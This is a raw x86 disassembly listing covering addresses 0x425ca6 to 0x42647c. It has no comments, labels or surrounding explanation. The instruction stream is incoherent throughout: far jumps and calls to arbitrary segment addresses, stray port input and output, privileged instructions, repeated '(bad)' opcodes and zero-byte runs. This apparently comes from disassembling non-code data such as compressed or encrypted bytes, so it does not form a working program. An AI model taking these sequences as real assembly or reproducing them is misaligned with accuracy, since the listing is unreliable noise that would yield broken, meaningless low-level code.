  425ca6:	jmp    0x21a7:0xed577fd5
  425cad:	adc    cl,BYTE PTR fs:[bx+si+0x4abf]
  425cb3:	sahf   
  425cb4:	adc    eax,DWORD PTR [ebx+0x674b9960]
  425cba:	daa    
  425cbb:	jl     0x425c9c
  425cbd:	mov    bh,0xe3
  425cbf:	ja     0x425c9f
  425cc1:	or     edx,DWORD PTR [ebx]
  425cc3:	xlat   BYTE PTR es:[ebx]
  425cc5:	loope  0x425cfc
  425cc7:	mov    edi,0x1dfe1ce6
  425ccc:	cmp    dh,BYTE PTR [ebx-0x2d750798]
  425cd2:	test   esp,edx
  425cd4:	inc    edx
  425cd5:	mov    cl,0x2e
  425cd7:	sahf   
  425cd8:	inc    esi
  425cd9:	pop    edx
  425cda:	sub    edx,edi
  425cdc:	pop    es
  425cdd:	call   0x6930:0xb511025e
  425ce4:	cmp    al,0x9e
  425ce6:	cmp    bl,BYTE PTR ds:0xca651457
  425cec:	inc    edi
  425ced:	and    bh,BYTE PTR [eax+0x7e92abb3]
  425cf3:	push   ebx
  425cf4:	xchg   DWORD PTR [edi+0x1f],ebx
  425cf7:	pop    ss
  425cf8:	iret   
  425cf9:	outs   dx,BYTE PTR ds:[esi]
  425cfa:	push   ebp
  425cfb:	js     0x425ca3
  425cfd:	mov    al,0x6
  425cff:	icebp  
  425d00:	out    0x5d,al
  425d02:	inc    esi
  425d03:	stos   DWORD PTR es:[edi],eax
  425d04:	dec    esp
  425d05:	ret    
  425d06:	js     0x425d2c
  425d08:	fwait
  425d09:	cdq    
  425d0a:	imul   esp,DWORD PTR [eax+0xc7e2c5],0x0
  425d14:	add    BYTE PTR [eax],al
  425d16:	add    BYTE PTR [eax],al
  425d18:	add    BYTE PTR [eax],al
  425d1a:	dec    edx
  425d1b:	xchg   DWORD PTR [edx+0x4c],edx
  425d1e:	(bad)  
  425d20:	pop    esi
  425d21:	xchg   DWORD PTR [edi-0x692def1],ecx
  425d27:	pop    esi
  425d28:	jnp    0x425d81
  425d2a:	(bad)  
  425d2b:	aam    0x1
  425d2d:	add    ch,bh
  425d2f:	add    DWORD PTR [eax],eax
  425d31:	add    BYTE PTR [eax],cl
  425d33:	inc    ebx
  425d34:	push   ds
  425d35:	imul   esi,DWORD PTR [ebx+0x9],0xffffffc6
  425d39:	mov    DWORD PTR [eax],eax
  425d3b:	adc    cl,BYTE PTR [eax+ecx*2]
  425d3e:	add    ebx,DWORD PTR [esi+0x20ffe0c5]
  425d44:	jne    0x425d34
  425d46:	call   0x9d41:0x17e6c6fc
  425d4d:	mov    ah,0x40
  425d4f:	mov    edi,0xf2c9b886
  425d54:	pop    edi
  425d55:	cmp    esp,edi
  425d57:	xor    ecx,DWORD PTR [edx+0x67fe8ee8]
  425d5d:	ins    DWORD PTR es:[edi],dx
  425d5e:	mov    ch,0xb6
  425d60:	xchg   edx,eax
  425d61:	adc    ebp,ebx
  425d63:	int3   
  425d64:	(bad)
  425d67:	es xchg esi,eax
  425d69:	or     bl,bh
  425d6b:	lock sbb dl,BYTE PTR [eax+edx*4+0x6a331307]
  425d73:	inc    esp
  425d74:	cmp    dh,ah
  425d76:	test   eax,0xfbb9dcbf
  425d7b:	popa   
  425d7c:	fadd   st,st(0)
  425d7e:	out    0x4f,eax
  425d80:	aad    0x5
  425d82:	nop
  425d83:	xchg   edx,eax
  425d84:	sbb    bl,BYTE PTR [edi]
  425d86:	out    0x27,al
  425d88:	mul    dh
  425d8a:	adc    dh,BYTE PTR [esi+0x2e3225e7]
  425d90:	dec    eax
  425d91:	push   ds
  425d92:	mov    eax,0x1f418475
  425d97:	xor    al,BYTE PTR [ebx+ebp*8-0x10]
  425d9b:	hlt    
  425d9c:	adc    BYTE PTR [edx+0x7a3cb79b],dl
  425da2:	loopne 0x425e23
  425da4:	jmp    0x425dee
  425da6:	outs   dx,DWORD PTR ds:[esi]
  425da7:	mov    ah,0xda
  425da9:	xor    DWORD PTR [ecx-0x7d186cd4],esp
  425daf:	arpl   WORD PTR [ebx],sp
  425db1:	or     ebp,DWORD PTR [edx]
  425db3:	jecxz  0x425d4e
  425db5:	xchg   edi,eax
  425db6:	add    ecx,DWORD PTR ds:0xfe67244b
  425dbc:	test   DWORD PTR [ebx+0x2c],ebx
  425dbf:	popw   ds
  425dc1:	retf   0x6aa8
  425dc4:	fld    TBYTE PTR [eax]
  425dc6:	jns    0x425d9c
  425dc8:	pop    esp
  425dc9:	jl     0x425dcc
  425dcb:	imul   eax,DWORD PTR [ebx-0x4f],0xa9e1fe20
  425dd2:	stos   BYTE PTR es:[edi],al
  425dd3:	and    eax,0x55033e67
  425dd8:	lea    eax,[ebp+0x28ee1062]
  425dde:	out    dx,eax
  425ddf:	es dec eax
  425de1:	loope  0x425e02
  425de3:	add    dh,cl
  425de5:	adc    BYTE PTR [ecx-0x45],bh
  425de8:	scas   eax,DWORD PTR es:[edi]
  425de9:	shl    BYTE PTR [ebx],1
  425deb:	shr    BYTE PTR [edx+0xde9743],cl
  425df1:	sub    ecx,DWORD PTR [esp+ebp*1]
  425df4:	test   dh,0xc1
  425df7:	add    al,0xd0
  425df9:	pop    ss
  425dfa:	cmp    DWORD PTR [ecx],0xffffffda
  425dfd:	not    DWORD PTR [eax+edi*8-0x19aa0ea7]
  425e04:	rcl    BYTE PTR [eax],1
  425e06:	jnp    0x425e72
  425e08:	enter  0x48cb,0xf5
  425e0c:	push   cs
  425e0d:	cld    
  425e0e:	pop    edi
  425e0f:	popf   
  425e10:	pop    ds
  425e11:	in     al,0xb6
  425e13:	jmp    0x7cce703f
  425e18:	popa   
  425e19:	mov    ecx,0x463e6724
  425e1e:	fmul   QWORD PTR [edx+ecx*8-0x24]
  425e22:	cmp    BYTE PTR [ecx],dh
  425e24:	lods   eax,DWORD PTR ds:[esi]
  425e25:	ds das 
  425e27:	lds    edx,FWORD PTR [ebx]
  425e29:	addr16 pop edi
  425e2b:	jmp    0x139f0ef9
  425e30:	cs ins DWORD PTR es:[edi],dx
  425e32:	mov    eax,ds:0xac6c9c42
  425e37:	add    eax,0xa1da2d1
  425e3c:	and    eax,DWORD PTR [ebp+0x39d00572]
  425e42:	push   esp
  425e43:	mov    esp,0xc3d66d37
  425e48:	std    
  425e49:	retf   0xc5c1
  425e4c:	jmp    0xe18c:0x53dfa11
  425e53:	sub    eax,0xacb4ba94
  425e58:	gs cmp al,0xdb
  425e5b:	add    DWORD PTR cs:[edi+0x1f],0xffffffc4
  425e60:	stos   DWORD PTR es:[edi],eax
  425e61:	mov    ch,0xd5
  425e63:	in     eax,0x21
  425e65:	cmp    BYTE PTR [edi],cl
  425e67:	fs xchg esi,eax
  425e69:	lods   al,BYTE PTR ds:[esi]
  425e6a:	jmp    0xe1ec898
  425e6f:	cdq    
  425e70:	leave  
  425e71:	xor    BYTE PTR [ebp+0x76c3d3bf],bh
  425e77:	imul   ebx,DWORD PTR [ebx],0xffffffc5
  425e7a:	adc    bh,BYTE PTR [eax]
  425e7c:	push   esp
  425e7d:	popa   
  425e7e:	jo     0x425ec7
  425e80:	ds jge 0x425e34
  425e83:	inc    ebp
  425e84:	pusha  
  425e85:	rol    DWORD PTR [ebp+0x175724f5],0xc4
  425e8c:	hlt    
  425e8d:	arpl   bp,di
  425e8f:	lea    esi,[ecx]
  425e91:	in     al,dx
  425e92:	out    0x1f,al
  425e94:	jg     0x425ef6
  425e96:	mov    ah,0xf0
  425e98:	stos   DWORD PTR es:[edi],eax
  425e99:	jns    0x425e4f
  425e9b:	dec    edi
  425e9c:	stc    
  425e9d:	pop    edx
  425e9e:	pop    DWORD PTR [esi+0x3a]
  425ea1:	fnstcw WORD PTR [edi]
  425ea3:	ss loop 0x425ed8
  425ea6:	test   esi,eax
  425ea8:	dec    ebp
  425ea9:	(bad)
  425ead:	out    dx,eax
  425eae:	popf   
  425eaf:	ds mov bl,0x84
  425eb2:	push   ds
  425eb3:	and    DWORD PTR [edx+ecx*4+0x543b1e03],0xffffffc3
  425ebb:	sbb    esp,DWORD PTR [ebx]
  425ebd:	inc    esi
  425ebe:	mov    al,0xf4
  425ec0:	in     eax,0x51
  425ec2:	imul   ebp,DWORD PTR [esi+0x762aaf67],0x321db70b
  425ecc:	fnstsw WORD PTR [edx]
  425ece:	outs   dx,DWORD PTR ds:[esi]
  425ecf:	mov    DWORD PTR [ecx],ebp
  425ed1:	xor    ebx,edx
  425ed3:	fcmovnbe st,st(4)
  425ed5:	idiv   DWORD PTR fs:[esp+eax*1]
  425ed9:	retf   
  425eda:	mov    al,ds:0x418696d4
  425edf:	lds    ebp,FWORD PTR [edx+0x6ddd1135]
  425ee5:	lods   al,BYTE PTR ds:[esi]
  425ee6:	mov    esi,DWORD PTR [esi+edx*2]
  425ee9:	lock bound ecx,QWORD PTR [ecx-0x76]
  425eed:	inc    edx
  425eee:	icebp  
  425eef:	ins    BYTE PTR es:[edi],dx
  425ef0:	cmp    DWORD PTR [ecx-0x6],0x7d8701be
  425ef7:	jg     0x425efc
  425ef9:	loop   0x425eaa
  425efb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425efc:	stos   BYTE PTR es:[edi],al
  425efd:	call   0xe1a5ab35
  425f02:	add    dh,ch
  425f04:	pusha  
  425f05:	mov    eax,0x5456e7de
  425f0a:	jecxz  0x425ef1
  425f0c:	call   0x7ccd:0x3e3c9ef8
  425f13:	je     0x425f21
  425f15:	mov    edi,0xbdbd8839
  425f1a:	(bad)  
  425f1b:	in     al,dx
  425f1c:	(bad)  
  425f1d:	lds    ebx,FWORD PTR [ebx]
  425f1f:	sbb    eax,0xb9ddedc4
  425f24:	out    0x65,al
  425f26:	push   edi
  425f27:	loopne 0x425eb4
  425f29:	sbb    ch,BYTE PTR [eax-0x6f6b726e]
	...
  425f37:	add    BYTE PTR [eax],al
  425f39:	add    BYTE PTR [edx],cl
  425f3b:	xchg   edx,eax
  425f3c:	jl     0x425f77
  425f3e:	cld    
  425f3f:	dec    DWORD PTR [edi-0x4d]
  425f42:	or     DWORD PTR [eax+eax*1],ebp
  425f45:	sub    esi,DWORD PTR [esi+0x64]
  425f48:	not    BYTE PTR [edx+ecx*4-0x2a]
  425f4c:	add    DWORD PTR [eax],eax
  425f4e:	std    
  425f4f:	add    DWORD PTR [eax],eax
  425f51:	add    BYTE PTR [edi+edx*8-0x451ad0f6],ah
  425f58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f59:	dec    eax
  425f5a:	and    eax,0x7124349c
  425f5f:	pop    ds
  425f60:	sar    DWORD PTR [ebp+esi*1-0x37],1
  425f64:	pushf  
  425f65:	push   esp
  425f66:	and    al,0xf1
  425f68:	and    al,0x5d
  425f6a:	sub    esi,eax
  425f6c:	jecxz  0x425fdd
  425f6e:	sub    ecx,ebp
  425f70:	or     al,0x99
  425f72:	push   ds
  425f73:	enter  0x6c6d,0xbc
  425f77:	in     eax,dx
  425f78:	retf   0xd08a
  425f7b:	dec    edx
  425f7c:	(bad)  [eax]
  425f7e:	lds    esi,FWORD PTR [eax-0x2de3a622]
  425f84:	int    0x3e
  425f86:	sti    
  425f87:	mov    esi,0xa369cff3
  425f8c:	fld    QWORD PTR [edx-0x46be0f4b]
  425f92:	stos   DWORD PTR es:[edi],eax
  425f93:	xor    ebx,DWORD PTR [esi-0x6819a840]
  425f99:	jnp    0x425fd4
  425f9b:	inc    ebx
  425f9c:	mov    ds:0x4f733489,eax
  425fa1:	jl     0x425fd0
  425fa3:	mov    ds:0xef9b683c,al
  425fa8:	neg    DWORD PTR [eax]
  425faa:	cld    
  425fab:	mov    DWORD PTR [ebp-0xc],edx
  425fae:	push   edi
  425faf:	adc    ah,BYTE PTR [eax+0x63f09355]
  425fb5:	pushf  
  425fb6:	loopne 0x425fb3
  425fb8:	retf   
  425fb9:	sbb    DWORD PTR [ecx],ebx
  425fbb:	mov    bl,0x92
  425fbd:	jnp    0x425fd8
  425fbf:	fild   DWORD PTR [ecx]
  425fc1:	dec    edx
  425fc2:	add    ebp,edi
  425fc4:	sbb    al,BYTE PTR [esi+ebp*4-0x10da97d3]
  425fcb:	jecxz  0x425f88
  425fcd:	or     eax,0xe08fb80c
  425fd2:	inc    ebx
  425fd3:	pop    ecx
  425fd4:	xor    ecx,DWORD PTR [ebx-0x20]
  425fd7:	movups XMMWORD PTR [di+0xde5],xmm7
  425fdd:	push   cs
  425fde:	pusha  
  425fdf:	cdq    
  425fe0:	(bad)  
  425fe1:	mov    ebp,0xb4b8f587
  425fe6:	repz xchg esi,eax
  425fe8:	ins    BYTE PTR es:[edi],dx
  425fe9:	xchg   esi,eax
  425feb:	imul   ebp,DWORD PTR ds:0x328a8b7d,0x65
  425ff2:	ds out 0xbf,al
  425ff5:	(bad)  
  425ff7:	push   ebp
  425ff8:	push   ecx
  425ff9:	xchg   BYTE PTR [ebp+0xb],al
  425ffc:	js     0x426053
  425ffe:	pushf  
  425fff:	adc    DWORD PTR [eax+ebx*1],edx
  426002:	mov    BYTE PTR ds:0x5fbfad53,dl
  426008:	jno    0x42606c
  42600a:	push   ebx
  42600b:	and    ebp,DWORD PTR [esi+0x57]
  42600e:	imul   eax,DWORD PTR [ecx+0x33],0xffffffaa
  426012:	lds    esi,FWORD PTR ds:0xb7c87382
  426018:	and    ebp,esi
  42601a:	das    
  42601b:	inc    esi
  42601c:	sub    ch,BYTE PTR [eax-0x2c]
  42601f:	xor    BYTE PTR [eax+0x6052767a],0x1c
  426026:	es jle 0x426096
  426029:	cmp    bh,BYTE PTR [ecx+0x30]
  42602c:	sub    ah,BYTE PTR [eax]
  42602e:	ins    DWORD PTR es:[edi],dx
  42602f:	sub    dl,cl
  426031:	ja     0x4260a8
  426033:	fstp   TBYTE PTR [ebp-0x69]
  426036:	jb     0x425fe3
  426038:	adc    esi,ebx
  42603a:	mov    ebx,0xe726aa4b
  42603f:	sti    
  426040:	push   0x3c
  426042:	xlat   BYTE PTR ds:[ebx]
  426043:	nop
  426044:	bound  eax,QWORD PTR [ebx-0x5617c0ec]
  42604a:	add    al,0x58
  42604c:	into   
  42604d:	push   0xab1bfe67
  426052:	aad    0xd7
  426054:	add    eax,0x9f706b87
  426059:	and    ch,bl
  42605b:	jb     0x426022
  42605d:	(bad)  
  42605e:	mov    ch,0x11
  426060:	adc    ah,BYTE PTR [edi-0x74]
  426063:	arpl   bp,bx
  426065:	and    eax,0x3a8e3c5d
  42606a:	les    eax,FWORD PTR [esi-0x5b]
  42606d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42606e:	and    ecx,ebx
  426070:	or     al,0x94
  426072:	xor    esp,DWORD PTR [ebp-0x19cce7cc]
  426078:	pop    es
  426079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42607a:	or     eax,0x47bd948f
  42607f:	pop    es
  426080:	inc    ebx
  426081:	gs mov ah,0xb7
  426084:	mov    ebp,0x55614386
  426089:	xchg   ecx,eax
  42608a:	inc    DWORD PTR [edi+0x8]
  42608d:	das    
  42608e:	stos   BYTE PTR es:[edi],al
  42608f:	push   edx
  426090:	sub    al,BYTE PTR ds:0x4ad1c86c
  426096:	push   esp
  426097:	das    
  426098:	mov    edi,0xcefb680a
  42609d:	cdq    
  42609e:	jp     0x42602c
  4260a0:	sub    ebx,DWORD PTR ds:0x50ec4883
  4260a6:	push   eax
  4260a7:	inc    esp
  4260a8:	imul   esi,DWORD PTR [edx],0x850bfb23
  4260ae:	sbb    bh,BYTE PTR [eax+0x60217d08]
  4260b4:	aaa    
  4260b5:	jno    0x4260b1
  4260b7:	jp     0x42610a
  4260b9:	mov    eax,0x77c54763
  4260be:	jmp    0xb58b:0xd9bae21d
  4260c5:	jmp    0x499d:0x376860b3
  4260cc:	ja     0x42606f
  4260ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260cf:	xor    ecx,DWORD PTR [edi+0x5]
  4260d2:	fimul  WORD PTR [ecx]
  4260d4:	test   BYTE PTR [ecx],dl
  4260d6:	jp     0x426114
  4260d8:	outs   dx,BYTE PTR ds:[esi]
  4260d9:	(bad)  
  4260da:	rcr    BYTE PTR [ecx+edi*1+0x19],1
  4260de:	xor    ecx,DWORD PTR [edi-0x5b]
  4260e1:	dec    edi
  4260e2:	ffreep st(0)
  4260e4:	adc    al,0x9b
  4260e6:	dec    edi
  4260e7:	add    edx,DWORD PTR [ebp-0x5d13d268]
  4260ed:	sub    BYTE PTR [edi+0x6d],0x28
  4260f1:	xor    edx,DWORD PTR [ebx]
  4260f3:	jecxz  0x4260f7
  4260f5:	sub    eax,0x265555f5
  4260fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260fb:	sbb    bh,BYTE PTR [esi-0x4d31d330]
  426101:	cmp    ecx,esi
  426103:	hlt    
  426104:	pop    ss
  426105:	out    0xe1,eax
  426107:	push   0xf496f2e8
  42610c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42610d:	push   ecx
  42610e:	pop    eax
  42610f:	iret   
  426110:	stc    
  426111:	scas   al,BYTE PTR es:[edi]
  426112:	push   ecx
  426113:	jne    0x4260e4
  426115:	scas   al,BYTE PTR es:[edi]
  426116:	jne    0x42609f
  426118:	loop   0x4260b3
  42611a:	addr16 iret 
  42611c:	and    DWORD PTR [edi+0x7e54075b],ecx
  426122:	lahf   
  426123:	jg     0x4260e6
  426125:	push   0x7c
  426127:	mov    ch,0xf2
  426129:	aam    0xbd
  42612b:	lahf   
  42612c:	jne    0x4260d0
  42612e:	jns    0x4260f4
  426130:	fnstcw WORD PTR [eax-0x3e]
  426133:	popf   
  426134:	repnz iret 
  426136:	cmp    eax,0x397d0a04
  42613b:	in     al,0x7d
  42613d:	add    ecx,esp
  42613f:	add    ah,al
  426141:	int    0xf1
  426143:	retf   0xee2d
  426146:	das    
  426147:	ins    BYTE PTR es:[edi],dx
  426148:	out    dx,eax
  426149:	(bad)  
  42614a:	sub    bl,dl
  42614c:	mov    ecx,0xed94
	...
  426159:	add    bl,al
  42615b:	and    ecx,edx
  42615d:	dec    eax
  42615e:	repz clc 
  426160:	fld    TBYTE PTR [ebx-0x2cd29d30]
  426166:	cli    
  426167:	mov    edi,0xd88756d9
  42616c:	add    DWORD PTR [eax],eax
  42616e:	std    
  42616f:	add    DWORD PTR [eax],eax
  426171:	add    BYTE PTR [ecx],bl
  426173:	fs retf 
  426175:	addr16 imul dl
  426178:	add    bl,ah
  42617a:	cdq    
  42617b:	ror    BYTE PTR [edi+0x5b],0xaf
  42617f:	sahf   
  426180:	cdq    
  426181:	jmp    0xa9a66d8e
  426186:	ja     0x4261da
  426188:	add    edi,DWORD PTR [eax+0x45cf405a]
  42618e:	add    edi,ecx
  426190:	out    dx,eax
  426191:	cmc    
  426192:	nop
  426193:	dec    ebx
  426194:	jecxz  0x426169
  426196:	mov    bl,0x6c
  426198:	arpl   WORD PTR [edx+0x529f9cd6],sp
  42619e:	fdiv   QWORD PTR [edx]
  4261a0:	add    BYTE PTR [edx],0x6d
  4261a3:	inc    ebp
  4261a4:	outs   dx,BYTE PTR ds:[esi]
  4261a5:	pop    edi
  4261a6:	dec    esi
  4261a7:	inc    eax
  4261a8:	addr16 mov dh,0x40
  4261ab:	sub    dl,ch
  4261ad:	and    al,0x2d
  4261af:	xor    DWORD PTR ds:0x4877340f,ecx
  4261b5:	popf   
  4261b6:	dec    esp
  4261b7:	lods   eax,DWORD PTR ds:[esi]
  4261b8:	rcl    BYTE PTR [esi],1
  4261ba:	sub    BYTE PTR [eax],0x73
  4261bd:	push   edi
  4261be:	jp     0x42622e
  4261c0:	xchg   ebp,eax
  4261c1:	(bad)  
  4261c3:	pop    edi
  4261c4:	test   dl,bh
  4261c6:	xchg   ebx,eax
  4261c7:	jno    0x4261b8
  4261c9:	aad    0xbe
  4261cb:	fsub   QWORD PTR [edi+0x70af7230]
  4261d1:	cld    
  4261d2:	arpl   WORD PTR [esi+0x66],ax
  4261d5:	or     edi,DWORD PTR [ebx]
  4261d7:	inc    eax
  4261d8:	mov    eax,ds:0xa5e27992
  4261dd:	lahf   
  4261de:	mov    ds,WORD PTR [ebx-0x399a3624]
  4261e4:	ret    
  4261e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4261e6:	adc    eax,0xdb8e5e94
  4261eb:	dec    ebp
  4261ec:	fidivr WORD PTR [ebp-0x29]
  4261ef:	jae    0x4261da
  4261f1:	(bad)  
  4261f4:	dec    edi
  4261f5:	je     0x426214
  4261f7:	aad    0x9a
  4261f9:	lods   al,BYTE PTR ds:[esi]
  4261fa:	sar    BYTE PTR [ebx+0xce3264e],cl
  426200:	pop    ebx
  426201:	push   esi
  426202:	inc    esp
  426203:	aaa    
  426204:	jbe    0x42623d
  426206:	push   ss
  426207:	push   eax
  426208:	or     eax,0xbca53b4f
  42620d:	jp     0x426258
  42620f:	stos   BYTE PTR es:[edi],al
  426210:	cmp    al,0x53
  426212:	cmp    eax,0xf629563
  426217:	rol    BYTE PTR [edx+ebx*4+0x78],cl
  42621b:	ret    0xb6c6
  42621e:	mov    es,WORD PTR [esi]
  426220:	nop
  426221:	pusha  
  426222:	jmp    0x963dbd63
  426227:	jb     0x42628b
  426229:	dec    ecx
  42622a:	sub    DWORD PTR [ebx+0x4f],0xc6671817
  426231:	pop    esp
  426232:	dec    ebx
  426233:	retf   0xd020
  426236:	add    ah,cl
  426238:	jmp    0x17ad:0xc76f1d23
  42623f:	mov    ds:0xd1c1c74e,al
  426244:	fwait
  426245:	sbb    eax,0x177779ba
  42624a:	sub    BYTE PTR [esi],cl
  42624c:	dec    ebp
  42624d:	sbb    ebx,esi
  42624f:	sbb    al,0xbc
  426251:	ins    DWORD PTR es:[edi],dx
  426252:	data16 mov al,ds:0xceacaef3
  426258:	out    dx,al
  426259:	mul    BYTE PTR ds:0x81dec27b
  42625f:	rcr    BYTE PTR [esi],cl
  426261:	fidivr DWORD PTR [esi]
  426263:	and    dl,dh
  426265:	sub    DWORD PTR [esi+ebx*8-0x1c4ad7db],esp
  42626c:	adc    DWORD PTR [eax+0x46],ebx
  42626f:	sar    bh,1
  426271:	ficomp WORD PTR [edi-0x6f]
  426274:	and    eax,DWORD PTR [edx-0x80]
  426277:	out    dx,eax
  426278:	mov    edi,0x4e1ddd69
  42627e:	std    
  42627f:	sbb    edx,DWORD PTR [edi+0x6a7a2cf1]
  426285:	addr16 aad 0xb
  426288:	pop    eax
  426289:	jle    0x426305
  42628b:	mov    bh,0xd4
  42628d:	iret   
  42628e:	out    0x36,al
  426290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426292:	test   al,0x90
  426294:	inc    esp
  426295:	pop    es
  426296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426297:	push   es
  426298:	mov    dh,0xbc
  42629a:	adc    dh,cl
  42629c:	fsubr  DWORD PTR [ebx-0x5f9af61a]
  4262a2:	mov    BYTE PTR [edi+0x41],dh
  4262a5:	push   ebx
  4262a6:	inc    esi
  4262a7:	and    al,0x43
  4262a9:	fist   DWORD PTR [ebx]
  4262ab:	jno    0x4262aa
  4262ad:	and    bl,al
  4262af:	and    eax,DWORD PTR [edi+eax*8]
  4262b2:	push   ebp
  4262b3:	icebp  
  4262b4:	jle    0x42629f
  4262b6:	push   eax
  4262b7:	in     eax,dx
  4262b8:	mov    eax,0x50e88199
  4262bd:	ror    eax,cl
  4262bf:	ins    DWORD PTR es:[edi],dx
  4262c0:	sbb    ah,dl
  4262c2:	pop    eax
  4262c3:	rol    DWORD PTR [ecx+edi*8],0xb4
  4262c7:	in     eax,0x15
  4262c9:	pop    ds
  4262ca:	push   edx
  4262cb:	and    DWORD PTR [edx+eax*2],ebp
  4262ce:	pop    ebp
  4262cf:	pop    ecx
  4262d0:	jnp    0x42627b
  4262d2:	mov    edi,0x7253363
  4262d7:	ins    BYTE PTR es:[edi],dx
  4262d8:	mov    esp,0x31c39049
  4262dd:	rol    esp,cl
  4262df:	adc    ecx,DWORD PTR [edi]
  4262e1:	jae    0x42633e
  4262e3:	stc    
  4262e4:	cwde   
  4262e5:	add    bl,BYTE PTR [edi]
  4262e7:	mov    BYTE PTR [ecx+0x0],cl
  4262ea:	lock in al,dx
  4262ec:	sbb    al,0xb4
  4262ee:	int3   
  4262ef:	pop    ebx
  4262f0:	into   
  4262f1:	dec    ebx
  4262f2:	jbe    0x426347
  4262f4:	out    0x51,eax
  4262f6:	test   al,0x3c
  4262f8:	les    esi,FWORD PTR [esi-0x3aa14c29]
  4262fe:	inc    edi
  4262ff:	push   edi
  426300:	dec    ecx
  426301:	xchg   ebp,eax
  426302:	sbb    esp,DWORD PTR [eax-0x39]
  426305:	inc    ecx
  426306:	cmp    al,0xbd
  426308:	push   ds
  426309:	shr    DWORD PTR [eax+0x73],0xc7
  42630d:	push   eax
  42630e:	das    
  42630f:	pop    edx
  426310:	dec    esi
  426311:	mov    ebp,0x9d204a54
  426316:	cmp    ah,BYTE PTR [ebx+0x11]
  426319:	mov    ecx,0xd9d931cc
  42631e:	int3   
  42631f:	leave  
  426320:	push   ds
  426321:	xor    BYTE PTR [esi-0x59],bl
  426324:	sahf   
  426325:	fs mov ah,0x6f
  426328:	and    eax,0x550bc56c
  42632d:	mov    BYTE PTR [edx+0x41],ch
  426330:	mov    cl,0x9c
  426332:	dec    edx
  426333:	aam    0x6e
  426335:	adc    cl,BYTE PTR [esi+0x7316ac9e]
  42633b:	and    ah,ch
  42633d:	pusha  
  42633e:	retf   
  42633f:	int3   
  426340:	outs   dx,DWORD PTR ds:[esi]
  426341:	mov    ah,0x22
  426343:	mov    dh,0xe4
  426345:	add    al,0xe1
  426347:	jmp    0x275d1a01
  42634c:	pop    esp
  42634d:	popa   
  42634e:	inc    ebp
  42634f:	or     al,0x17
  426351:	loop   0x4263ab
  426353:	(bad)  
  426354:	pop    ebp
  426355:	imul   ebp,DWORD PTR [ecx-0x5eabe7ce],0xf7be7289
  42635f:	retf   
  426360:	pop    ecx
  426361:	(bad)
  426364:	xlat   BYTE PTR ds:[ebx]
  426365:	xchg   DWORD PTR [edx],ecx
  426367:	leave  
  426368:	mov    BYTE PTR [ebp-0x61],dl
  42636b:	js     0x426313
  42636d:	mov    ecx,0xfa
	...
  42637a:	call   0x9eff:0xefe9ef59
  426381:	jnp    0x42638f
  426383:	push   esi
  426384:	mov    ss,ebx
  426386:	mov    ecx,0x8405cfbf
  42638b:	fiadd  DWORD PTR [ecx]
  42638d:	add    ch,bh
  42638f:	add    DWORD PTR [eax],eax
  426391:	add    BYTE PTR [ebp-0x4d],al
  426394:	xor    al,0xd8
  426396:	in     eax,dx
  426397:	push   edi
  426398:	fstp   TBYTE PTR [esi-0x7292c560]
  42639e:	sahf   
  42639f:	fs daa 
  4263a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263a2:	cmc    
  4263a3:	inc    edx
  4263a4:	mov    al,0xb0
  4263a6:	pushf  
  4263a7:	pop    esi
  4263a8:	xchg   ecx,eax
  4263a9:	imul   edi,DWORD PTR [edx+edx*4-0x4f4f453c],0xffffffe6
  4263b1:	adc    esp,DWORD PTR [edi]
  4263b3:	ja     0x426385
  4263b5:	ret    
  4263b6:	and    ecx,DWORD PTR [edi-0x65688d90]
  4263bc:	lahf   
  4263bd:	inc    esp
  4263be:	dec    ebx
  4263bf:	icebp  
  4263c0:	mov    fs,ebx
  4263c2:	mov    edx,0x6dffe164
  4263c7:	daa    
  4263c8:	test   eax,0x38a05a15
  4263cd:	(bad)  
  4263ce:	mov    eax,ds:0xb66cf120
  4263d3:	sub    eax,0x4c762805
  4263d8:	mov    ch,0x47
  4263da:	mov    si,0x7d99
  4263de:	sub    esp,edx
  4263e0:	and    eax,0xaa150737
  4263e5:	sbb    esi,DWORD PTR [edx-0x44]
  4263e8:	adc    DWORD PTR [ecx+ecx*4],0x1c913eb4
  4263ef:	add    eax,0x17390283
  4263f4:	push   edi
  4263f5:	add    DWORD PTR [ecx],edx
  4263f7:	out    0x39,eax
  4263f9:	xchg   edi,eax
  4263fa:	pusha  
  4263fb:	mov    esi,0xddfb8435
  426400:	call   0xb8295846
  426405:	(bad)  
  426406:	or     eax,0xdad4691f
  42640b:	les    ebp,FWORD PTR [eax+edi*8-0x44]
  42640f:	sub    dl,ch
  426411:	aaa    
  426412:	and    DWORD PTR [ebx],edi
  426414:	adc    DWORD PTR [ebx+edi*4+0x7],ecx
  426418:	or     ebx,DWORD PTR [edx-0x60]
  42641b:	ds sti 
  42641d:	or     edx,DWORD PTR [ecx+0x36]
  426420:	add    eax,0x2caabd50
  426425:	add    BYTE PTR [ebp+0x22],ch
  426428:	or     eax,0xdafd698e
  42642d:	add    BYTE PTR [eax+esi*2+0x27769c92],0xb0
  426435:	shl    BYTE PTR [esi],1
  426437:	sub    dl,BYTE PTR [edx]
  426439:	mov    ecx,0x2198da5a
  42643e:	rcr    BYTE PTR [edi],1
  426440:	sub    DWORD PTR [eax+0x797b8890],eax
  426446:	inc    ebp
  426447:	fs dec eax
  426449:	pop    edx
  42644a:	rcr    BYTE PTR [ebp+0x608743a9],cl
  426450:	pop    ecx
  426451:	sub    eax,0x966869b3
  426456:	push   edi
  426457:	cmp    dh,dh
  426459:	fcomp  DWORD PTR [edx+0x1e]
  42645c:	rcr    eax,0xca
  42645f:	mov    ds:0xbb559245,eax
  426464:	(bad)  
  426465:	rcr    BYTE PTR [edi],0x48
  426468:	shr    DWORD PTR [edx],1
  42646a:	fisubr DWORD PTR [ecx]
  42646c:	gs mov esp,0x47296050
  426472:	or     eax,0x40903853
  426477:	(bad)  
  426478:	mov    al,0xc4
  42647a:	mov    ch,bh
  42647c:	inc    edx
